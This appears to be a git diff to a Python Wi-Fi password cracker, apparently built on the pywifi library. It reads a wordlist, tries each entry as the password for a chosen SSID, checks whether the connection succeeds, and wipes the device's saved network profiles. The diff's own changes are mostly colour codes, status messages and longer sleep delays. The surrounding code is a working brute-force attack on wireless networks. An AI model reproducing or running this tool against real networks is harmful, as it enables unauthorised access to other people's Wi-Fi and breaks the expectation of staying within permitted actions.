@@ -53,20 +53,25 @@ def main(ssid, password, number):
     profile.cipher = const.CIPHER_TYPE_CCMP  # type of cipher
     profile.key = password  # use generated password
 
-    print("network_profiles: ", len(wifi.iface.network_profiles()))
-    print("remove_all_network_profiles")
+    print(DARK_GREEN)
+    print(PLUS, "total network profiles: ", len(wifi.iface.network_profiles()))
+    print(PLUS, "remove_all_network_profiles")
     wifi.iface.remove_all_network_profiles()  # remove all the profiles which are previously connected to device
+    print(PLUS, "total network_profiles: ", len(wifi.iface.network_profiles()))
 
-    print("network_profiles: ", len(wifi.iface.network_profiles()))
-
+    print(GREEN)
+    print(PLUS, "creating profile:")
     tmp_profile = wifi.iface.add_network_profile(profile)  # add new profile
 
+    print(DARK_GREEN)
     for var in vars(tmp_profile):
         print(f"{var:15}: {getattr(tmp_profile, var)}")
 
-    time.sleep(0.1)  # if script not working change time to 1 !!!!!!
+    time.sleep(1)  # if script not working change time to 1 !!!!!!
+    print(GREEN)
+    print(PLUS, "connecting...")
     wifi.iface.connect(tmp_profile)  # trying to Connect
-    time.sleep(0.35)  # 1s
+    time.sleep(1)  # 1s
 
     if wifi.iface.status() == const.IFACE_CONNECTED:  # checker
         time.sleep(1)
@@ -81,14 +86,16 @@ def main(ssid, password, number):
 
 # opening and reading the file
 def pwd(ssid, file):
-    print(BOLD, "[~] Cracking...")
+    print(YELLOW)
+    print(TILDE, "Cracking...")
     number = 0
     with open(file, 'r', encoding='utf8') as words:
         for line in words:
             number += 1
             line = line.split("\n")
             pwd = line[0]
-            print(RESET, f"[{number}] Trying {ssid} with {pwd}")
+            print(GREEN)
+            print(f"[{number}] Trying {ssid} with {pwd}")
             main(ssid, pwd, number)
 
 
@@ -118,7 +125,7 @@ def menu(client_ssid, path_to_file):
 
     args = parser.parse_args()
 
-    print(CYAN, "[+] You are using ", BOLD, platform.system(), platform.machine(), "...")
+    print(DARK_CYAN, "[+] You are using ", BOLD, platform.system(), platform.machine(), "...")
     time.sleep(1.5)
 
     # taking wordlist and ssid if given else take default
